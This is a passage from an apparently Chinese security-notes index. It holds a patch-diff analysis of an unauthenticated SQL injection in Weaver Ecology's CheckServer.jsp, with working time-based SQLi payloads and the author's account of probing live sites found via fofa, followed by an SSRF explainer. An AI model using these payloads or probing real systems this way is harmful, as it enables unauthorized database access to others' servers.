<p>\u7531\u4e0a\u9762\u8865\u4e01\u7248\u672c\uff0c\u6211\u4eec\u9700\u8981\u5230\u5b98\u7f51\u4e0b\u8f7d\u4e24\u4e2a\u8865\u4e01\u5305\uff1a</p> <p>1. https://www.weaver.com.cn/cs/package/Ecology_security_20230418_v9.0_v10.57_deta.zip?v=20230420</p> <p>2. https://www.weaver.com.cn/cs/package/Ecology_security_20221014_v10.55.zip?v=20230420</p> <p>\u4ee5\u786e\u4fdd\u6211\u4eec\u80fd\u591f\u6839\u636e\u4e24\u4e2a\u7248\u672c\u7684\u8865\u4e01\u5305\u53bb\u7cbe\u786e\u5b9a\u4f4d\u6f0f\u6d1e\u4f4d\u7f6e</p> <p>\u5c06\u8fd9\u4e24\u4e2a\u8865\u4e01\u5305\u89e3\u538b\u540e\uff0c\u5148\u7528idea\u6253\u5f00\u5176\u4e2d\u4e00\u4e2a\u76ee\u5f55\uff0c\u7136\u540e\u4f7f\u7528idea\u81ea\u5e26\u7684\u6bd4\u8f83\u5bf9\u8c61\u529f\u80fd\u53bb\u6bd4\u8f83\u8fd9\u4e24\u4e2a\u8865\u4e01\u5305\uff1a</p> <p>\u200b</p> <p>\u200b</p> <p>\u521a\u5f00\u59cb\uff0c\u6211\u5bf9\u6bd4\u7684\u65f6\u5019\u81ea\u5df1\u4e5f\u5f88\u8d39\u52b2\uff0c\u4e0d\u77e5\u9053\u5982\u4f55\u5b9a\u4f4d\u6f0f\u6d1e\u4f4d\u7f6e\uff0c\u540e\u9762\u9759\u4e0b\u5fc3\u6765\u6839\u636e\u65f6\u95f4\u770b\u6f0f\u6d1e\u901a\u544a\u57284.18\u53f7\uff0c\u6211\u5c31\u60f3\u7740\u6839\u636e\u6587\u4ef6\u65e5\u671f\u53bb\u770b\uff0c\u770b\u54ea\u4e2a\u6587\u4ef6\u79bb18\u53f7\u8fd1\uff0c\u5c31\u6709\u53ef\u80fd\u662f\u88ab\u6539\u52a8\u7684\u3002</p> <p>\u800c\u4e14\u901a\u544a\u91cc\u4e5f\u8bf4\u4e86\uff0c\u8fd9\u4e2aSQL\u6ce8\u5165\u662f\u672a\u6388\u6743\u3002\u901a\u544a\u5730\u5740\uff1a\u5fae\u4fe1\u516c\u4f17\u5e73\u53f0 (qq.com)</p> <p>\u7136\u540e\u6ce8\u610f\u5230\u8fd9\u4e2a10.57\u8865\u4e01\u91cc\u7684\u8fd9\u4e2a\u6587\u4ef6\uff1a<code>ecology/WEB-INF/securityRule/E9/4d162ce4-d74e-4371-944f-814d850ff895_forbidden_20230406.xml</code>\u200b</p> <p></p> <p>\u8fd9\u91cc\u8bbe\u7f6e\u4e86\u51e0\u4e2a\u9700\u8981\u68c0\u67e5\u7684URL\uff0c\u6211\u770b\u7740\u65f6\u95f4\u633a\u8fd1\uff0c\u6211\u5c31fofa\u627e\u4e86\u51e0\u4e2a\u7ad9\u5c1d\u8bd5\u8bbf\u95ee\u4e86\u4e00\u4e0b\u54ea\u4e2a\u672a\u6388\u6743\uff0c\u7136\u540e\u5c31\u53d1\u73b0\u4e86</p> <p>http://xxxxxx/mobile/plugin/CheckServer.jsp\u662f\u672a\u6388\u6743</p> <p>\u200b\u200b</p> <p>\u7136\u540e\u53c8\u770b\u5230\u4e86\u8fd9\u4e2a\u6587\u4ef6<code>ecology/WEB-INF/securityRule/E8/4d162ce4-d74e-4371-944f-814d850ff7f9_mobile_setting.xml</code>\u200b</p> <p>\u200b</p> <p>\u610f\u601d\u53ef\u80fd\u662f\u9488\u5bf9\u8fd9\u4e2aurl\u5bf9mobilesettings\u505a\u4e86\u67d0\u4e9b\u9650\u5236\uff0c\u7136\u540e\u6211\u5c31\u53bb\u627e\u8fd9\u4e2a<code>weaver.security.validators.MobileSettingsValidator</code>\u200b</p> <p><code>ecology/WEB-INF/myclasses/weaver/security/validators/MobileSettingsValidator.class</code>\u200b</p> <p>\u200b</p> <p>\u6682\u65f6\u8fd8\u4e0d\u77e5\u9053\u8fd9\u4e2a\u7c7b\u662f\u5e72\u5565\u7684\uff0c\u5c31\u5148\u7559\u7740\uff0c\u7136\u540e\u6211\u8fd8\u770b\u523010.57\u91cc\u7684CheckServer.jsp\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6709\u6539\u52a8\uff1a</p> <p>\u200b</p> <p>\u8fd9\u4e48\u591a\u65b0\u6539\u52a8\u6307\u5411\u5b83\uff0c\u6211\u611f\u89c9\u5f88\u6709\u53ef\u80fd\u5c31\u662fCheckServer.jsp\u8fd9\u4e2a\u6587\u4ef6\u6709\u5927\u95ee\u9898\uff0c\u6ce8\u5165\u70b9\u5f88\u6709\u53ef\u80fd\u5c31\u5728\u8fd9\u3002\u7136\u540e\u5c31\u627e\u4e86\u4e2aEcology9\u7684\u5b89\u88c5\u5305\u672c\u5730\u628a\u73af\u5883\u642d\u5efa\u8d77\u6765\uff0c\u5177\u4f53\u5206\u6790\u4ee3\u7801\u4e86\u3002</p> <p>\u6d4b\u8bd5\u73af\u5883\u7248\u672c\uff1a<code>9.00.2003.18</code>\u200b</p> <p>\u627e\u5230\u6e90\u7801\u4e2d\u7684CheckServer.jsp\u6587\u4ef6\uff1a<code>mobile/plugin/CheckServer.jsp</code>\u200b\uff0c\u53d1\u73b0\u91cc\u9762\u662f\u6709\u5185\u5bb9\u7684\uff1a</p> <p>\u200b</p> <p>\u800c\u4e14\u4f20\u53c2\u91cc\u9762\u5e26\u4e2a<code>mobileSetting</code>\u200b\uff0c\u90a3\u5f88\u6709\u53ef\u80fd\u5c31\u662f\u8fd9\u4e2a\u5730\u65b9\u6709\u95ee\u9898\u4e86\uff1b\u6839\u636etype\u4f20\u503c\u5224\u65ad\u5c5e\u4e8e\u54ea\u4e2a\u5206\u652f\uff0c\u7136\u540e\u8fdb\u5165\u5bf9\u5e94\u7684\u65b9\u6cd5\u4e2d\uff0c\u8fd9\u6b21\u4e3b\u8981\u7814\u7a76\u7684\u662fmobileSetting\u8fd9\u4e2a\u5224\u65ad\u5206\u652f\uff0c\u56e0\u6b64\u4f20\u503c\u7684\u65f6\u5019\u76f4\u63a5</p> <p>\u4f20type=mobileSetting\uff0c\u5373\u53ef\u8fdb\u5165\u5bf9\u5e94\u5206\u652f\uff0c\u7136\u540e\u8fdb\u5165<code>result = ps.syncMobileSetting(settings, timestamp)</code>\u200b\u8fd9\u4e2a\u65b9\u6cd5\u5185\u90e8\u770b\u770b\u3002</p> <p>\u200b</p> <p>\u8fd9\u4e0d\u5c31\u59a5\u59a5\u7684SQL\u62fc\u63a5\u5417\u3002\u3002\u3002\u4f46\u662f\u6211\u5c31\u662f\u5728\u8fd9\u91cc\u5361\u4e86\u4e00\u5929\u3002\u6309\u6d41\u7a0b\u6765\u770b\u6211\u4eec\u53ea\u8981\u4f20\u5165?type=mobileSetting&amp;settings=x&amp;timestamp=x\uff0c\u5c31\u80fd\u987a\u5229\u8d70\u5230\u6ce8\u5165\u5904\uff0c\u90a3\u6211\u4eec\u65ad\u70b9\u8c03\u8bd5\u4e00\u4e0b\u770b\u770b\u60c5\u51b5</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u770b\u5230\u8fd9\u6211\u5c31\u61f5\u4e86\uff0c\u4e3a\u5565\u4f20\u503c\u5230\u8fd9\u91cc\u53d8\u6210\u4e86<code>-999999999N</code>\u200b\uff0c\u6211\u5c1d\u8bd5\u4e86\u5f88\u591a\u503c\uff1a\u5b57\u6bcd\u3001\u6570\u5b57\uff0c\u7279\u6b8a\u5b57\u7b26\uff0c\u53d1\u73b0\u53ea\u6709\u6570\u5b57\u662f\u6ca1\u6709\u6539\u53d8\uff0c\u521d\u6b65\u5224\u65ad\u53ef\u80fd\u662f\u5f3a\u8f6c\u6216\u8005\u505a\u4e86\u9650\u5236\uff0c\u6211\u4e3a\u4e86\u65b9\u4fbf\uff0c\u76f4\u63a5\u628a\u503c\u8f93\u51fa</p> <p>\u5230response\u4e0a\u4e86\u3002</p> <pre><code>String timestamp = fu.getParameter(\"timestamp\");\nout.println(timestamp);\n</code></pre> <p>\u200b</p> <p>\u200b</p> <p>\u81f3\u4e8e\u4e3a\u4ec0\u4e48timestamp\u53c2\u6570\u503c\u4f1a\u8fdb\u884c\u8fc7\u6ee4\uff0c\u6211\u53ea\u77e5\u9053\u65ad\u70b9\u540e\u8d70\u5230\u8fd9\u91cc\uff1a</p> <p>\u901a\u8fc7<code>classbean/weaver/file/FileUpload.class#getParameter()</code>\u200b\u8fd9\u4e2a\u65b9\u6cd5</p> <p>\u8d70\u5230<code>classbean/weaver/security/webcontainer/XssRequestWeblogic.class#getParameter()</code>\u200b\uff0c\u4f46\u662f\u91cc\u9762\u7684\u4ee3\u7801\u592a\u5197\u4f59\u4e86\uff0c\u770b\u7684\u5934\u75bc\uff0c\u4ee5\u540e\u518d\u5206\u6790\u5427</p> <p>\u200b\u200b</p> <p>\u7136\u540e\u5230\u8fd9\u91cc\u7684\u65f6\u5019\u5176\u5b9e\u5df2\u7ecf\u5feb\u8981\u653e\u5f03\u8fd9\u4e2a\u731c\u6d4b\u7684\u6f0f\u6d1e\u70b9\u4e86\uff0c\u7ee7\u7eed\u7ffb\u770b<code>classbean/weaver/mobile/plugin/ecology/service/PluginServiceImpl.class#syncMobileSetting()</code>\u200b\u8fd9\u4e2a\u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u7a81\u7136\u60f3\u8d77\u6765<code>syncMobileSetting()</code>\u200b</p> <p>\u8fd9\u4e2a\u65b9\u6cd5\u5e94\u8be5\u5728\u54ea\u89c1\u8fc7<code>ecology/WEB-INF/myclasses/weaver/security/validators/MobileSettingsValidator.class</code>\u200b\uff0c\u8fd9\u4e0d\u5c31\u662f\u8865\u4e01\u5305\u91cc\u65b0\u589e\u7684\u7c7b\u561b\uff0c\u90a3\u770b\u6765\u6f0f\u6d1e\u4f4d\u7f6e\u80af\u5b9a\u5728\u8fd9\u4e2a\u65b9\u6cd5\u91cc\uff0c\u6211\u5c31\u7ee7\u7eed\u7ffb\u770b\u8fd9\u4e2a\u65b9\u6cd5\uff1a</p> <p>\u56e0\u4e3a\u8fd9\u91cc\u4f7f\u7528\u5230\u4e86settings\u8fd9\u4e2a\u53c2\u6570\uff0c\u56e0\u6b64\u6211\u9996\u5148\u5c1d\u8bd5\u6253\u5370\u8fd9\u4e2a\u53c2\u6570\u503c\uff0c\u770b\u5b83\u6709\u6ca1\u6709\u8fc7\u6ee4\uff1a</p> <p>\u200b\u200b</p> <p>\u200b</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u5b83\u5b8c\u6574\u7684\u8f93\u51fa\u4e86\u6211\u60f3\u8981\u7684\u7ed3\u679c\uff0c\u7136\u540e\u6211\u63a5\u4e0b\u6765\u53bb\u627e\u770b\u770b\u8fd9\u4e2a\u65b9\u6cd5\u7684\u4ee3\u7801\u91cc\u6709\u6ca1\u6709SQL\u62fc\u63a5\u7684\u5730\u65b9\uff0c\u6700\u540e\u627e\u5230\u4e86\u5728\u8fd9\u4e2a\u5185\u90e8\u65b9\u6cd5\u91cc</p> <p>\u200b<code>classbean/weaver/mobile/plugin/ecology/service/PluginServiceImpl.classs#yncMobileSetting()--&gt;this.saveMobileDocSetting(var10, var12, var13);</code>\u200b</p> <p>\u200b</p> <p>\u200b</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u91cc\u6709\u5f88\u591a\u5730\u65b9\u53ef\u4ee5\u505a\u62fc\u63a5\u7684\uff0c\u4f46\u662f\u8981\u6839\u636e\u5206\u652f\u53bb\u5177\u4f53\u5206\u6790\uff1a</p> <p>\u6211\u4eec\u5148\u6765\u8bbe\u7f6e\u51e0\u4e2a\u57fa\u7840\u53d8\u91cf</p> <pre><code>    saveMobileDocSetting(int var1, String var2, String var3)\n    var1 = (int)scope\n    var2 = (String)setting\n    var3 = (string)modulename\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u7b2c\u4e00\u79cd\u662fvar2\u4e3a\u7a7a\uff0c\u7b2c\u4e8c\u79cd\u662fvar2\u4e0d\u4e3a\u7a7a\u7684\u60c5\u51b5\uff0c\u6211\u4eec\u5148\u6765\u5206\u6790\u7b2c\u4e00\u79cd\uff1a</p> <p>1: var2\u4e3a\u7a7a</p> <p></p> <p>\u7531\u8fd9\u4e2a\u5224\u65ad\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0c\u5f53var1(scope) &gt; 0 \u5e76\u4e14var3(modulename) \u4e0d\u662f\u7a7a\u503c\u7684\u65f6\u5019\uff0c\u4f1a\u8fdb\u5165\u5224\u65ad\uff0c\u56e0\u6b64\u6211\u4eec\u76ee\u524d\u7684payload\u53ef\u4ee5\u5199\u6210\uff1a</p> <p><code>settings=[{\"scope\":\"1\",\"modulename\":\"a\"}]</code>\u200b</p> <p>\u7ee7\u7eed\u8fdb\u5165\u5185\u90e8\u7684if\u5206\u652f\u540e\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u91cc\u9700\u8981\u786e\u4fdd<code>StringUtils.isBlank(var2)</code>\u200b\u4e3atrue\uff0c\u624d\u4f1a\u8fdb\u5165\u5224\u65ad\uff0c\u800cvar2=setting\uff0c\u56e0\u6b64\u6211\u4eec\u7684poc\u53ef\u4ee5\u7ee7\u7eed\u5199\u6210\uff1a</p> <p><code>settings=[{\"scope\":\"1\",\"modulename\":\"a\",\"setting\":\"\"}]</code>\u200b</p> <p>\u73b0\u5728\u7684\u95ee\u9898\u662f\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u8fdb\u5165\u5230\u5185\u90e8\u65b9\u6cd5<code>saveMobileDocSetting()</code>\u200b\u4e2d\uff0c\u56de\u8fc7\u5934\u6765\u770b<code>classbean/weaver/mobile/plugin/ecology/service/PluginServiceImpl.class#syncMobileSetting()</code>\u200b\u65b9\u6cd5</p> <p>\u200b</p> <p>\u56e0\u6b64\u6211\u4eec\u7ee7\u7eed\u8bbe\u7f6e\u6211\u4eec\u7684poc: \u200b<code>settings=[{\"scope\":\"1\",\"module\":\"2\",\"modulename\":\"a\",\"setting\":\"\"}]</code>\u200b</p> <p>\u6210\u529f\u8fdb\u5165\u5206\u652f\u540e\uff0c\u5c31\u76f4\u63a5\u6267\u884csql\u8bed\u53e5\u4e86\uff0c\u901a\u8fc7\u7b2c\u4e09\u4e2asql\u8bed\u53e5\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0cpayload\u53ef\u4ee5\u76f4\u63a5\u63d2\u5165modulename\u4e2d\uff0c\u901a\u8fc7\u65ad\u70b9\u8c03\u8bd5\u5e76\u7ed3\u5408mysql\uff0c\u53bb\u5206\u6790\uff1a</p> <p>\u200b</p> <p>\u6210\u529f\u8d70\u5230\u4e86<code>saveMobileDocSetting()</code>\u200b\u5185\u90e8\u65b9\u6cd5\u4e2d:</p> <p>\u200b</p> <p>\u5728\u6267\u884c\u4e09\u6761sql\u8bed\u53e5\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u770b\u770b\u6570\u636e\u5e93\u4e2d\u8be5\u8868\u7684\u72b6\u6001\uff1a</p> <p>\u200b</p> <p>\u6267\u884c\u7b2c\u4e8c\u6761\u8bed\u53e5\u540e\uff1a</p> <p>\u200b</p> <p>\u6267\u884c\u7b2c\u4e09\u6761\u8bed\u53e5\u540e\uff1a</p> <p>\u200b</p> <p>\u6211\u4eec\u5c1d\u8bd5\u63d2\u5165\u6076\u610fpoc:</p> <p><code>settings=[{\"scope\":\"1\",\"module\":\"2\",\"modulename\":\"1'+and+benchmark(100000000,sha(1))+and+'\",\"setting\":\"\"}]&amp;timestamp=11111</code>\u200b</p> <p>\u200b</p> <p>\u200d</p> <p>2. var2 \u4e0d\u4e3a\u7a7a:</p> <p>\u5f53var2(setting)\u4e0d\u4e3a\u7a7a\u7684\u60c5\u51b5\u4e0b\uff0c\u5c31\u8d70\u8fd1\u4e86else\u5206\u652f\u4e2d\u4e86</p> <p>\u200b</p> <p>\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u770b\u8fd9\u6761sql\u8bed\u53e5\u4e2d\u7684var12\uff0cvar1\u3002\u770b\u770b\u8be5else\u5206\u652f\u4e2d\u662f\u5982\u4f55\u5904\u7406\u8fd9\u4e24\u4e2a\u53d8\u91cf\u7684</p> <p>\u5355\u51fbvar1\u53c2\u6570\uff0c\u6211\u4eec\u662f\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2aelse\u5206\u652f\u4e2d\u662f\u6ca1\u6709var1\u7684\u52a8\u4f5c\u7684\uff1a</p> <p>\u200b</p> <p>\u200b\u200b\u200b</p> <p>\u6240\u4ee5\u5176\u5b9e\u6211\u4eec\u6574\u4e2apoc\u53ea\u9700\u8981\u4fee\u6539setting\uff0c\u4fdd\u8bc1\u4e0d\u4e3a\u7a7a\uff0c\u5373\u53ef\u8fdb\u884cselect\u6ce8\u5165\uff1a</p> <p>\u200b</p> <p>\u7efc\u4e0a\uff1a</p> <pre><code>    insert sqli: [{\"scope\":\"1\",\"module\":\"2\",\"modulename\":\"1'+and+benchmark(100000000,sha(1))+and+'\",\"setting\":\"\"}]\n    select sqli: [{\"scope\":\"1\",\"module\":\"2\",\"modulename\":\"1'+and+benchmark(100000000,sha(1))+and+'\",\"setting\":\"1\"}]\n</code></pre> <p>\u200d</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/","title":"SSRF","text":"<p>SSRF</p> <p>\u670d\u52a1\u5668\u8bf7\u6c42\u4f2a\u9020\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u8bf1\u5bfc\u670d\u52a1\u5668\u7aef\u5e94\u7528\u7a0b\u5e8f\u5411\u975e\u9884\u671f\u4f4d\u7f6e\u53d1\u51fa\u8bf7\u6c42\u3002</p> <p>\u5728\u5178\u578b\u7684 SSRF \u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5bfc\u81f4\u670d\u52a1\u5668\u4e0e\u7ec4\u7ec7\u57fa\u7840\u8bbe\u65bd\u5185\u7684\u4ec5\u9650\u5185\u90e8\u670d\u52a1\u5efa\u7acb\u8fde\u63a5\u3002\u5728\u5176\u4ed6\u60c5\u51b5\u4e0b\uff0c\u4ed6\u4eec\u53ef\u80fd\u4f1a\u5f3a\u5236\u670d\u52a1\u5668\u8fde\u63a5\u5230\u4efb\u610f\u5916\u90e8\u7cfb\u7edf\uff0c\u4ece\u800c\u53ef\u80fd\u6cc4\u9732\u6388\u6743\u51ed\u636e\u7b49\u654f\u611f\u6570\u636e\u3002</p> <p>\u6f0f\u6d1e\u4ea7\u751f\u539f\u7406</p> <p>\u5371\u5bb3</p> <p>\u4e0e\u5df2\u77e5\u7684\u5185\u90e8\u7cfb\u7edf\u4ea4\u4e92</p> <p>\u901a\u8fc7\u7aef\u53e3\u626b\u63cf\u53d1\u73b0\u5185\u90e8\u670d\u52a1</p> <p>\u62ab\u9732\u672c\u5730\u654f\u611f\u6570\u636e</p> <p>\u5728\u76ee\u6807\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5305\u542b\u6587\u4ef6</p> <p>\u4f7f\u7528UNC\u8def\u5f84(Windows)\u6cc4\u6f0fNetNTLM\u54c8\u563b</p> <p>\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c</p> <p>\u6d4b\u8bd5\u70b9</p> <p>\u90e8\u5206HTTP\u8bf7\u6c42\uff0c\u5305\u62ecURL\u3001\u8bf7\u6c42\u5934\u3001\u7528\u6237\u8f93\u5165\u5b57\u6bb5</p> <p>\u6587\u4ef6\u5bfc\u5165\uff0c\u4f8b\u5982HTML\u3001PDF\u3001\u56fe\u50cf\u7b49</p> <p>\u8fdc\u7a0b\u670d\u52a1\u5668\u8fde\u63a5\u4ee5\u83b7\u53d6\u6570\u636e</p> <p>API\u89c4\u8303\u5bfc\u5165</p> <p>\u4eea\u8868\u677f\u5305\u62ecping\u548c\u7c7b\u4f3c\u7684\u529f\u80fd\u6765\u68c0\u67e5\u670d\u52a1\u5668\u72b6\u6001</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#ssrf","title":"SSRF","text":""},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#_1","title":"\u539f\u7406","text":"<p>\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\uff08\u4e5f\u79f0\u4e3a SSRF\uff09\u662f\u4e00\u79cd Web \u5b89\u5168\u6f0f\u6d1e\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u8bf1\u5bfc\u670d\u52a1\u5668\u7aef\u5e94\u7528\u7a0b\u5e8f\u5411\u975e\u9884\u671f\u4f4d\u7f6e\u53d1\u51fa\u8bf7\u6c42\u3002</p> <p>\u5728\u5178\u578b\u7684 SSRF \u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5bfc\u81f4\u670d\u52a1\u5668\u4e0e\u7ec4\u7ec7\u57fa\u7840\u8bbe\u65bd\u5185\u7684\u4ec5\u9650\u5185\u90e8\u670d\u52a1\u5efa\u7acb\u8fde\u63a5\u3002\u5728\u5176\u4ed6\u60c5\u51b5\u4e0b\uff0c\u4ed6\u4eec\u53ef\u80fd\u4f1a\u5f3a\u5236\u670d\u52a1\u5668\u8fde\u63a5\u5230\u4efb\u610f\u5916\u90e8\u7cfb\u7edf\uff0c\u4ece\u800c\u53ef\u80fd\u6cc4\u9732\u6388\u6743\u51ed\u636e\u7b49\u654f\u611f\u6570\u636e\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#_2","title":"\u6d4b\u8bd5\u65b9\u6cd5","text":"<p>\u6839\u636eSSRF\u6f0f\u6d1e\u7279\u5f81\uff0c\u6316\u6398\u65b9\u6cd5\u6709\u4e8c\uff1a</p> <ul> <li>\u6570\u636e\u5c42\u9762\u9700\u8981\u5173\u6ce8\u7684\u5173\u952e\u5b57\u6bb5\u662fURL\u3001IP\u5730\u5740\u3001\u94fe\u63a5\u7b49\uff0c\u5173\u952e\u5b57\u6709\uff1ashare\u3001wap\u3001url\u3001link\u3001src\u3001source\u3001target\u3001u\u30013g\u3001display\u3001sourceURl\u3001imageURL\u3001domain\u2026\u2026</li> <li>\u4e1a\u52a1\u5c42\u9762\u9700\u5173\u6ce8\u4efb\u4f55\u901a\u8fc7URL\u8fdb\u884c\u8d44\u6e90\u8c03\u7528\uff08\u5165\uff09\u6216\u5411\u5916\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\uff08\u51fa\uff09\u7684\u529f\u80fd\uff0c\u5982\u901a\u8fc7url\u6587\u4ef6\u4e0a\u4f20\u4e0b\u8f7d\u5904\u662f\u5b58\u5728SSRF\u6700\u591a\u7684\u573a\u666f\u3002\u5176\u4ed6\u5177\u4f53\u4e1a\u52a1\u573a\u666f\u5305\u62ec\uff1a\u5185\u5bb9\u5c55\u793a\u3001\u793e\u4ea4\u5206\u4eab\u3001\u5728\u7ebf\u7ffb\u8bd1\u3001\u6536\u85cf\u529f\u80fd\u3001WebMail\u90ae\u7bb1\u3001\u5404\u79cd\u5904\u7406\u5de5\u5177\uff08FFpmg\uff09\u7b49</li> </ul> <p>\u63a2\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\uff0c\u65b9\u6cd5\u6709\u4e8c\uff1a</p> <ul> <li>\u8bf7\u6c42\u5305\u4e2d\u5c06\u53c2\u6570\u66f4\u6539\u4e3a\u4e0d\u540c\u7684IP / DNS\u6216TCP\u7aef\u53e3\uff0c\u89c2\u5bdf\u8fd4\u56de\u5305\u957f\u5ea6\u3001\u8fd4\u56de\u7801\u3001\u8fd4\u56de\u4fe1\u606f\u53ca\u54cd\u5e94\u65f6\u95f4\uff0c\u4e0d\u540c\u5219\u53ef\u80fd\u5b58\u5728SSRF\u6f0f\u6d1e\uff1b</li> <li>\u8bf7\u6c42\u81ea\u5df1\u7684\u516c\u7f51\u670d\u52a1\u5668\uff08\u6216CEYE\uff09\uff0c\u4f7f\u7528nc \u2013lvp\u76d1\u542c\u8bf7\u6c42\u3002</li> </ul> <p>\u8bc1\u660e\u6f0f\u6d1e\u5b58\u5728\u540e\uff0c\u4f7f\u5371\u5bb3\u6700\u5927\u5316\u53ef\u8fdb\u4e00\u6b65\u5229\u7528\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#_3","title":"\u653b\u51fb\u5f71\u54cd","text":"<p>\u6210\u529f\u7684 SSRF \u653b\u51fb\u901a\u5e38\u4f1a\u5bfc\u81f4\u672a\u7ecf\u6388\u6743\u7684\u64cd\u4f5c\u6216\u8bbf\u95ee\u7ec4\u7ec7\u5185\u7684\u6570\u636e\uff0c\u65e0\u8bba\u662f\u5728\u6613\u53d7\u653b\u51fb\u7684\u5e94\u7528\u7a0b\u5e8f\u672c\u8eab\u8fd8\u662f\u5728\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4e0e\u4e4b\u901a\u4fe1\u7684\u5176\u4ed6\u540e\u7aef\u7cfb\u7edf\u4e2d\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0cSSRF \u6f0f\u6d1e\u53ef\u80fd\u5141\u8bb8\u653b\u51fb\u8005\u6267\u884c\u4efb\u610f\u547d\u4ee4\u6267\u884c\u3002</p> <p>\u5bfc\u81f4\u4e0e\u5916\u90e8\u7b2c\u4e09\u65b9\u7cfb\u7edf\u8fde\u63a5\u7684 SSRF \u6f0f\u6d1e\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6076\u610f\u653b\u51fb\uff0c\u8fd9\u4e9b\u653b\u51fb\u4f3c\u4e4e\u6e90\u81ea\u6258\u7ba1\u6613\u53d7\u653b\u51fb\u5e94\u7528\u7a0b\u5e8f\u7684\u7ec4\u7ec7\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#ssrf_1","title":"\u5e38\u89c1SSRF\u653b\u51fb","text":"<p>SSRF \u653b\u51fb\u901a\u5e38\u5229\u7528\u4fe1\u4efb\u5173\u7cfb\u6765\u5347\u7ea7\u6613\u53d7\u653b\u51fb\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u653b\u51fb\u5e76\u6267\u884c\u672a\u7ecf\u6388\u6743\u7684\u64cd\u4f5c\u3002\u8fd9\u4e9b\u4fe1\u4efb\u5173\u7cfb\u53ef\u80fd\u4e0e\u670d\u52a1\u5668\u672c\u8eab\u6709\u5173\uff0c\u4e5f\u53ef\u80fd\u4e0e\u540c\u4e00\u7ec4\u7ec7\u5185\u7684\u5176\u4ed6\u540e\u7aef\u7cfb\u7edf\u6709\u5173</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#ssrf_2","title":"\u9488\u5bf9\u670d\u52a1\u5668\u672c\u8eab\u7684SSRF\u653b\u51fb","text":"<p>\u5728\u9488\u5bf9\u670d\u52a1\u5668\u672c\u8eab\u7684 SSRF \u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u8bf1\u4f7f\u5e94\u7528\u7a0b\u5e8f\u901a\u8fc7\u5176\u73af\u56de\u7f51\u7edc\u63a5\u53e3\u5411\u6258\u7ba1\u5e94\u7528\u7a0b\u5e8f\u7684\u670d\u52a1\u5668\u53d1\u51fa HTTP \u8bf7\u6c42\u3002\u8fd9\u901a\u5e38\u6d89\u53ca\u63d0\u4f9b\u5e26\u6709\u4e3b\u673a\u540d\u7684 URL\uff0c\u4f8b\u5982<code>127.0.0.1</code>\uff08\u6307\u5411\u73af\u56de\u9002\u914d\u5668\u7684\u4fdd\u7559 IP \u5730\u5740\uff09\u6216<code>localhost</code>\uff08\u540c\u4e00\u9002\u914d\u5668\u7684\u5e38\u7528\u540d\u79f0\uff09\u3002</p> <p>\u8fd9\u79cd\u4fe1\u4efb\u5173\u7cfb\uff08\u6765\u81ea\u672c\u5730\u673a\u5668\u7684\u8bf7\u6c42\u7684\u5904\u7406\u65b9\u5f0f\u4e0e\u666e\u901a\u8bf7\u6c42\u4e0d\u540c\uff09\u901a\u5e38\u662f\u4f7f SSRF \u6210\u4e3a\u4e25\u91cd\u6f0f\u6d1e\u7684\u539f\u56e0\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#ssrf_3","title":"\u9488\u5bf9\u5176\u4ed6\u540e\u7aef\u7cfb\u7edf\u7684 SSRF \u653b\u51fb","text":"<p>\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u7ecf\u5e38\u51fa\u73b0\u7684\u53e6\u4e00\u79cd\u7c7b\u578b\u7684\u4fe1\u4efb\u5173\u7cfb\u662f\u5e94\u7528\u7a0b\u5e8f\u670d\u52a1\u5668\u80fd\u591f\u4e0e\u7528\u6237\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u7684\u5176\u4ed6\u540e\u7aef\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002\u8fd9\u4e9b\u7cfb\u7edf\u901a\u5e38\u5177\u6709\u4e0d\u53ef\u8def\u7531\u7684\u79c1\u6709 IP 